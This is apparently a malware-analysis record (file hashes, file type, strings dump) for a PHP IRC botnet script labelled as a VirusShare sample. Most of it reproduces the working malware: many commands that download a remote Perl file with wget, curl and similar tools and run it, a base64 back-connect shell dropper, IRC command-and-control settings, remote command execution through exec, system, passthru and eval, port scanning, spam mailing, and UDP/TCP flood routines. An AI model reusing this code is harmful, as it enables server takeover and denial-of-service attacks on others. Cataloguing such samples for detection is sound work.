fwrite($fp,base64_decode($dc_source));\n      passthru(\"perl /tmp/dc.pl $ip $port &\");\n      unlink(\"/tmp/dc.pl\");\n    }\n    else\n    {\n    if (is_writable(\"/var/tmp\"))\n    {\n      if (file_exists(\"/var/tmp/dc.pl\")) { unlink(\"/var/tmp/dc.pl\"); }\n      $fp=fopen(\"/var/tmp/dc.pl\",\"w\");\n      fwrite($fp,base64_decode($dc_source));\n      passthru(\"perl /var/tmp/dc.pl $ip $port &\");\n      unlink(\"/var/tmp/dc.pl\");\n    }\n    if (is_writable(\".\"))\n    {\n      if (file_exists(\"dc.pl\")) { unlink(\"dc.pl\"); }\n      $fp=fopen(\"dc.pl\",\"w\");\n      fwrite($fp,base64_decode($dc_source));\n      passthru(\"perl dc.pl $ip $port &\");\n      unlink(\"dc.pl\");\n    }\n    }\n  }\n} \n\n$bot = new pBot; \n$bot->start(); \n?>"
    },
    "filename": "VirusShare_3a62552e53054500d07ac592ea84fd63",
    "filesize": 29138,
    "filetype": "PHP script, ASCII text, with very long lines, with CR line terminators",
    "hashes": {
        "md5": "3a62552e53054500d07ac592ea84fd63",
        "sha1": "38d75b453443a26baff2c41b565e778bbc27c89a",
        "sha256": "95374e22d6db8ce9c53bc3fea36cbf4bec1cadfcb67308249e9df00c323d1d6a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php",
            "set_time_limit(0); ",
            "error_reporting(0);",
            "$url[2] = \"http://mxxx.webng.com/icon.txt\";",
            "$sfe[2] = \"exnam_logsd\";",
            "exec(); shell_exec(); system(); passthru();",
            "exec(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "exec(\"fetch -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "exec(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "exec(\"lynx -dump \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "exec(\"GET \".$url[2].\">\".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "exec(\"lwp-download \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "shell_exec(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "shell_exec(\"fetch -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "shell_exec(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "shell_exec(\"lynx -dump \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "shell_exec(\"GET \".$url[2].\">\".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "shell_exec(\"lwp-download \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "system(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "system(\"fetch -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "system(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "system(\"lynx -dump \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "system(\"GET \".$url[2].\">\".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "system(\"lwp-download \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "passthru(\"wget \".$url[2].\" -O \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "passthru(\"fetch -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "passthru(\"cUrl -O \".$sfe[2].\" \".$url[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "passthru(\"lynx -dump \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "passthru(\"GET \".$url[2].\">\".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "passthru(\"lwp-download \".$url[2].\" \".$sfe[2].\"; chmod 755 \".$sfe[2].\"; perl \".$sfe[2].\"*\");",
            "//-- /tmp",
            "exec(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "exec(\"fetch -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "exec(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "exec(\"lynx -dump \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "exec(\"GET \".$url[2].\">/tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "exec(\"lwp-download \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"fetch -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"lynx -dump \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"GET \".$url[2].\">/tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"lwp-download \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "system(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "system(\"fetch -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "system(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "system(\"lynx -dump \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "system(\"GET \".$url[2].\">/tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "system(\"lwp-download \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "passthru(\"wget \".$url[2].\" -O /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "passthru(\"fetch -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "passthru(\"cUrl -O /tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "passthru(\"lynx -dump \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "passthru(\"GET \".$url[2].\">/tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "passthru(\"lwp-download \".$url[2].\" /tmp/\".$sfe[2].\"; chmod 755 /tmp/\".$sfe[2].\"; perl /tmp/\".$sfe[2].\"*\");",
            "//-- /var/tmp",
            "exec(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "exec(\"fetch -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "exec(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "exec(\"lynx -dump \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "exec(\"GET \".$url[2].\">/var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "exec(\"lwp-download \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"fetch -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"lynx -dump \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"GET \".$url[2].\">/var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "shell_exec(\"lwp-download \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "system(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "system(\"fetch -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "system(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "system(\"lynx -dump \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "system(\"GET \".$url[2].\">/var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "system(\"lwp-download \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "passthru(\"wget \".$url[2].\" -O /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "passthru(\"fetch -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "passthru(\"cUrl -O /var/tmp/\".$sfe[2].\" \".$url[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "passthru(\"lynx -dump \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "passthru(\"GET \".$url[2].\">/var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "passthru(\"lwp-download \".$url[2].\" /var/tmp/\".$sfe[2].\"; chmod 755 /var/tmp/\".$sfe[2].\"; perl /var/tmp/\".$sfe[2].\"*\");",
            "set_time_limit(0); ",
            "error_reporting(0); ",
            "echo \"ok!\";",
            "class pBot {",
            " var $config = array(\"server\"=>\"irc.javairc.org\",",
            "                     \"port\"=>\"6667\",",
            "                     \"pass\"=>\"cok\",",
            "                     \"prefix\"=>\"HHHH\",",
            "                     \"maxrand\"=>\"4\",",
            "                     \"chan\"=>\"#korak\",",
            "                     \"chan2\"=>\"#korak\",",
            "                     \"key\"=>\"cok\",",
            "                     \"modes\"=>\"+i\",",
            "                     \"password\"=>\"tempek\",",
            "                     \"trigger\"=>\".\",",
            "                     \"hostauth\"=>\"BoCaH.LaLi.OmaH\" // * for any hostname (remember: /setvhost xdevil.org)",
            "                     );",
            " var $users = array(); ",
            " function start() ",
            "    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) ",
            "       $this->start(); ",
            "    $ident = $this->config['prefix'];",
            "    $alph = range(\"0\",\"9\");",
            "    for($i=0;$i<$this->config['maxrand'];$i++) ",
            "       $ident .= $alph[rand(0,9)];",
            "    if(strlen($this->config['pass'])>0) ",
            "       $this->send(\"PASS \".$this->config['pass']);",
            "    $this->send(\"USER \".$ident.\" 127.0.0.1 localhost :\".php_uname().\"\");",
            "    $this->set_nick();",
            "    $this->main();",
            " function main() ",
            "    while(!feof($this->conn)) ",
            "    { ",
            "       $this->buf = trim(fgets($this->conn,512)); ",
            "       $cmd = explode(\" \",$this->buf); ",
            "       if(substr($this->buf,0,6)==\"PING :\") ",
            "       { ",
            "          $this->send(\"PONG :\".substr($this->buf,6)); ",
            "       } ",
            "       if(isset($cmd[1]) && $cmd[1] ==\"001\") ",
            "       { ",
            "          $this->send(\"MODE \".$this->nick.\" \".$this->config['modes']); ",
            "          $this->join($this->config['chan'],$this->config['key']);",
            "          if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "          else { $safemode = \"off\"; }",
            "          $uname = php_uname();",
            "          $this->privmsg($this->config['chan2'],\"\\2Uname\\2: $uname \\2Mode\\2: $safemode \");",
            "       } ",
            "       if(isset($cmd[1]) && $cmd[1]==\"433\") ",
            "       { ",
            "          $this->set_nick(); ",
            "       } ",
            "       if($this->buf != $old_buf) ",
            "       { ",
            "          $mcmd = array(); ",
            "          $msg = substr(strstr($this->buf,\" :\"),2); ",
            "          $msgcmd = explode(\" \",$msg); ",
            "          $nick = explode(\"!\",$cmd[0]); ",
            "          $vhost = explode(\"@\",$nick[1]); ",
            "          $vhost = $vhost[1]; ",
            "          $nick = substr($nick[0],1); ",
            "          $host = $cmd[0]; ",
            "          if($msgcmd[0]==$this->nick) ",
            "          { ",
            "           for($i=0;$i<count($msgcmd);$i++) ",
            "              $mcmd[$i] = $msgcmd[$i+1]; ",
            "          } ",
            "          else ",
            "          { ",
            "           for($i=0;$i<count($msgcmd);$i++) ",
            "              $mcmd[$i] = $msgcmd[$i]; ",
            "          } ",
            "          if(count($cmd)>2) ",
            "          { ",
            "             switch($cmd[1]) ",
            "             { ",
            "                case \"QUIT\": ",
            "                   if($this->is_logged_in($host)) ",
            "                   { ",
            "                      $this->log_out($host); ",
            "                   } ",
            "                break; ",
            "                case \"PART\": ",
            "                   if($this->is_logged_in($host)) ",
            "                   { ",
            "                      $this->log_out($host); ",
            "                   } ",
            "                break; ",
            "                case \"PRIVMSG\": ",
            "                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\")) ",
            "                   { ",
            "                      if(substr($mcmd[0],0,1)==\".\") ",
            "                      { ",
            "                         switch(substr($mcmd[0],1)) ",
            "                         { ",
            "                            case \"cik\": ",
            "                              if($mcmd[1]==$this->config['password']) ",
            "                              { ",
            "                                 $this->privmsg($this->config['chan'],\"[\\2Auth\\2]: $nick !!\"); ",
            "                                 $this->log_in($host); ",
            "                              } ",
            "                              else ",
            "                              { ",
            "                                 $this->privmsg($this->config['chan'],\"[\\2Auth\\2]: $nick  jancok.. lu...!\"); ",
            "                              } ",
            "                            break; ",
            "                         } ",
            "                      } ",
            "                   } ",
            "                   elseif($this->is_logged_in($host)) ",
            "                   { ",
            "                      if(substr($mcmd[0],0,1)==\".\") ",
            "                      { ",
            "                         switch(substr($mcmd[0],1)) ",
            "                         { ",
            "                            case \"restart\": ",
            "                               $this->send(\"QUIT :Njomplang sek boz $nick\");",
            "                               fclose($this->conn); ",
            "                               $this->start(); ",
            "                            break; ",
            "                            case \"mail\": //mail to from subject message ",
            "                               if(count($mcmd)>4) ",
            "                               { ",
            "                                  $header = \"From: <\".$mcmd[2].\">\"; ",
            "                                  if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header)) ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2mail\\2]: Impossivel mandar e-mail.\");",
            "                                  } ",
            "                                  else ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2mail\\2]: Mensagem enviada para \\2\".$mcmd[1].\"\\2\"); ",
            "                                  } ",
            "                               } ",
            "                            break;",
            "                            case \"safe\":",
            "                               if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\")",
            "                               {",
            "                               $safemode = \"on\";",
            "                               }",
            "                               else {",
            "                               $safemode = \"off\";",
            "                               }",
            "                               $this->privmsg($this->config['chan'],\"[\\2safe mode\\2]: \".$safemode.\"\");",
            "                            break;",
            "                            case \"inbox\": //teste inbox",
            "                               if(isset($mcmd[1]))",
            "                               {",
            "                                  $token = md5(uniqid(rand(), true));",
            "                                  $header = \"From: <inbox\".$token.\"@xdevil.org>\";",
            "                                  $a = php_uname();",
            "                                  $b = getenv(\"SERVER_SOFTWARE\");",
            "                                  $c = gethostbyname($_SERVER[\"HTTP_HOST\"]);",
            "                                  if(!mail($mcmd[1],\"InBox Test\",\"#crew@corp. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: $a \\nvuln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <admin@xdevil.org>\",$header))",
            "                                  {",
            "                                     $this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Unable to send\");",
            "                                  }",
            "                                  else",
            "                                  {",
            "                                     $this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Message sent to \\2\".$mcmd[1].\"\\2\");",
            "                                  }",
            "                               }",
            "                            break;",
            "                            case \"conback\":",
            "                               if(count($mcmd)>2)",
            "                               {",
            "                                  $this->conback($mcmd[1],$mcmd[2]);",
            "                               }",
            "                            break;",
            "                            case \"dns\": ",
            "                               if(isset($mcmd[1])) ",
            "                               { ",
            "                                  $ip = explode(\".\",$mcmd[1]); ",
            "                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1])); ",
            "                                  } ",
            "                                  else ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1])); ",
            "                                  } ",
            "                               } ",
            "                            break; ",
            "                        case \"help\": ",
            "                         \t\t\t   $this->privmsg($this->config['chan'],\"[\\2comand help\\2]: Kowe Koyo Djembodz\");",
            "              \t\t\t  break;",
            "              \t\t",
            "                            case \"info\":",
            "                            case \"vunl\":",
            "                               if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "                               else { $safemode = \"off\"; }",
            "                               $uname = php_uname();",
            "                               $this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");",
            "                               $this->privmsg($this->config['chan'],\"[\\2vuln\\2]: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\");",
            "                            break;",
            "                            case \"uname\":",
            "                               if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "                               else { $safemode = \"off\"; }",
            "                               $uname = php_uname();",
            "                               $this->privmsg($this->config['chan'],\"[\\2info\\2]: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\" ( $uname (Mode: $safemode) )\");",
            "                            break;",
            "                            case \"rndnick\": ",
            "                               $this->set_nick(); ",
            "                            break; ",
            "                            case \"raw\":",
            "                               $this->send(strstr($msg,$mcmd[1])); ",
            "                            break; ",
            "                            case \"eval\":",
            "                              $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));",
            "                            break;",
            "\t\t\t                case \"sexec\":",
            "                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); ",
            "                               $exec = shell_exec($command); ",
            "                               $ret = explode(\"\\n\",$exec); ",
            "                               for($i=0;$i<count($ret);$i++) ",
            "                                  if($ret[$i]!=NULL) ",
            "                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); ",
            "                            break; ",
            "                            case \"exec\": ",
            "                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); ",
            "                               $exec = exec($command); ",
            "                               $ret = explode(\"\\n\",$exec); ",
            "                               for($i=0;$i<count($ret);$i++) ",
            "                                  if($ret[$i]!=NULL) ",
            "                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); ",
            "                            break; ",
            "                            case \"passthru\": ",
            "                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); ",
            "                               $exec = passthru($command); ",
            "                               $ret = explode(\"\\n\",$exec); ",
            "                               for($i=0;$i<count($ret);$i++) ",
            "                                  if($ret[$i]!=NULL) ",
            "                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); ",
            "                            break; ",
            "                            case \"popen\": ",
            "                               if(isset($mcmd[1])) ",
            "                               { ",
            "                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); ",
            "                                  $this->privmsg($this->config['chan'],\"[\\2popen\\2]: $command\");",
            "                                  $pipe = popen($command,\"r\"); ",
            "                                  while(!feof($pipe)) ",
            "                                  { ",
            "                                     $pbuf = trim(fgets($pipe,512)); ",
            "                                     if($pbuf != NULL) ",
            "                                        $this->privmsg($this->config['chan'],\"     : $pbuf\"); ",
            "                                  } ",
            "                                  pclose($pipe); ",
            "                               }  ",
            "\t\t\t   ",
            "                            case \"system\": ",
            "                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); ",
            "                               $exec = system($command); ",
            "                               $ret = explode(\"\\n\",$exec); ",
            "                               for($i=0;$i<count($ret);$i++) ",
            "                                  if($ret[$i]!=NULL) ",
            "                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); ",
            "                            break; ",
            "                            case \"pscan\": // .pscan 127.0.0.1 6667 ",
            "                               if(count($mcmd) > 2) ",
            "                               { ",
            "                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2open\\2\"); ",
            "                                  else ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2closed\\2\"); ",
            "                               } ",
            "                            break; ",
            "                            case \"ud.server\": // .ud.server <server> <port> [password] ",
            "                               if(count($mcmd)>2) ",
            "                               { ",
            "                                  $this->config['server'] = $mcmd[1]; ",
            "                                  $this->config['port'] = $mcmd[2]; ",
            "                                  if(isset($mcmcd[3])) ",
            "                                  { ",
            "                                   $this->config['pass'] = $mcmd[3]; ",
            "                                   $this->privmsg($this->config['chan'],\"[\\2update\\2]: Server trocado para \".$mcmd[1].\":\".$mcmd[2].\" Senha: \".$mcmd[3]); ",
            "                                  } ",
            "                                  else ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2update\\2]: Server trocado para \".$mcmd[1].\":\".$mcmd[2]); ",
            "                                  } ",
            "                               } ",
            "                            break; ",
            "                            case \"download\": ",
            "                               if(count($mcmd) > 2) ",
            "                               { ",
            "                                  if(!$fp = fopen($mcmd[2],\"w\")) ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download. Permissao negada.\"); ",
            "                                  } ",
            "                                  else ",
            "                                  { ",
            "                                     if(!$get = file($mcmd[1])) ",
            "                                     { ",
            "                                        $this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download de \\2\".$mcmd[1].\"\\2\"); ",
            "                                     } ",
            "                                     else ",
            "                                     { ",
            "                                        for($i=0;$i<=count($get);$i++) ",
            "                                        { ",
            "                                           fwrite($fp,$get[$i]); ",
            "                                        } ",
            "                                        $this->privmsg($this->config['chan'],\"[\\2download\\2]: Arquivo \\2\".$mcmd[1].\"\\2 baixado para \\2\".$mcmd[2].\"\\2\"); ",
            "                                     } ",
            "                                     fclose($fp); ",
            "                                  } ",
            "                               }",
            "                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/file /tmp/file\"); }",
            "                            break; ",
            "                            case \"die\": ",
            "                               $this->send(\"QUIT :die command from $nick\");",
            "                               fclose($this->conn); ",
            "                               exit; ",
            "                            case \"logout\": ",
            "                               $this->log_out($host); ",
            "                               $this->privmsg($this->config['chan'],\"[\\2auth\\2]: $nick deslogado!\"); ",
            "                            break; ",
            "                            case \"udpflood\": ",
            "                               if(count($mcmd)>3) ",
            "                               { ",
            "                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); ",
            "                               } ",
            "                            break; ",
            "                            case \"tcpflood\": ",
            "                               if(count($mcmd)>5) ",
            "                               { ",
            "                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); ",
            "                               } ",
            "                            break; ",
            "                         } ",
            "                      } ",
            "                   } ",
            "                break; ",
            "             } ",
            "          } ",
            "       } ",
            "       $old_buf = $this->buf; ",
            "    } ",
            "    $this->start(); ",
            " function send($msg) ",
            "    fwrite($this->conn,\"$msg\\r\\n\"); ",
            " function join($chan,$key=NULL) ",
            "    $this->send(\"JOIN $chan $key\"); ",
            " function privmsg($to,$msg)",
            "    $this->send(\"PRIVMSG $to :$msg\");",
            " function notice($to,$msg)",
            "    $this->send(\"NOTICE $to :$msg\");",
            " function is_logged_in($host) ",
            "    if(isset($this->users[$host])) ",
            "       return 1; ",
            "    else ",
            "       return 0; ",
            " function log_in($host) ",
            "    $this->users[$host] = true; ",
            " function log_out($host) ",
            "    unset($this->users[$host]); ",
            " function set_nick() {",
            "$querym=array(",
            "\"?\", \"!\", \"^^\", \" ^^\", \" :(\",\" :)\", \" ~:>\", \" :P~\", \" :D\", \".\", \"a\", \"i\", \"u\", \"e\", \"o\",",
            "\"z\", \"v\", \"z\", \"x\", \"c\", \"p\", \"m\", \"t\", \"k\", \"b\", \"s\", \"u\", \"bot\", \"g\", \"lo\", \"jo\", \"lol\"",
            "$tsu1=array(\"`\",\"|\",\"[\",\"]\",\"{\",\"}\",\"^\",\"_\");",
            "$tsu2=array(\"`\",\"|\",\"[\",\"]\",\"{\",\"}\",\"^\",\"-\",\"\\\\\",\"_\");",
            "$nicky=array(\"ErrOrz\");",
            "$usr1=array(\"Fxz\");",
            "  $this->nick = $nicky[rand(0,count($nicky) - 1)];",
            "    #$this->nick .= $this->config['prefix']; ",
            "    for($i=0;$i<$this->config['maxrand'];$i++) ",
            "      # $this->nick .= mt_rand(0,9); ",
            "    $this->send(\"NICK [\".rand(100, 9999).\"]\".$this->nick);",
            "  function udpflood($host,$packetsize,$time) {",
            "\t$this->privmsg($this->config['chan'],\"[\\2UdpFlood Started!\\2]\"); ",
            "\t$packet = \"\";",
            "\tfor($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }",
            "\t$timei = time();",
            "\t$i = 0;",
            "\twhile(time()-$timei < $time) {",
            "\t\t$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);",
            "      \tfwrite($fp,$packet);",
            "       \tfclose($fp);",
            "\t\t$i++;",
            "\t$env = $i * $packetsize;",
            "\t$env = $env / 1048576;",
            "\t$vel = $env / $time;",
            "\t$vel = round($vel);",
            "\t$env = round($env);",
